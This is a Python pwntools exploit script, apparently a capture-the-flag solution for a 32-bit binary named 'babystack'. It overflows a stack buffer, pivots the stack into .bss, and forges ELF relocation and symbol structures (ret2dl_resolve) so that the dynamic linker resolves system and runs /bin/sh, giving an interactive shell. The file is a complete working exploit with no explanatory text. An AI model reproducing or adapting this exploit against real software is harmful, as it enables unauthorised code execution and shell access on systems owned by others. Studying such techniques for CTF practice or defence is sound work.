from pwn import *

p = process('./babystack')
elf = ELF("./babystack")
resolver = 0x80482F0    #push link_map and call dl_resolve
buf = 0x804af00         #controllable area (.bss)
leave_ret = 0x8048455   #gadget
SYMTAB = 0x080481cc
STRTAB = 0x0804822c
JMPREL = 0x080482b0
def solve():
    payload1 = 'A'*40
    payload1 += p32(buf)
    payload1 += p32(elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) 

    # Now we create fake structures
    fake_struct_addr = buf + 0x14
    rel_offset = fake_struct_addr - JMPREL
    elf32_sym = fake_struct_addr + 0x8  # size of elf32_rel

    align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)    # align to 0x10 
    elf32_sym = elf32_sym + align                   # addr of elf32_sym
    index_sym = (elf32_sym - SYMTAB) / 0x10 

    r_info = (index_sym << 8) | 0x7

    elf32_rel = p32(elf.got['read']) + p32(r_info)
    st_name = (elf32_sym + 0x10) - STRTAB
    elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    payload2 = 'AAAA'           # fake ebp of resolver
    payload2 += p32(resolver)
    payload2 += p32(rel_offset)
    payload2 += 'AAAA'           # fake ret addr for system
    payload2 += p32(buf+100)     # system parameter
    payload2 += elf32_rel
    payload2 += 'A'*align
    payload2 += elf32_sym_struct
    payload2 += 'system\x00'
    payload2 += 'A'*(100 - len(payload2)) 
    payload2 += '/bin/sh\x00'

    p.send(payload1)
    p.send(payload2)
    p.interactive()
if __name__ == '__main__':
    solve()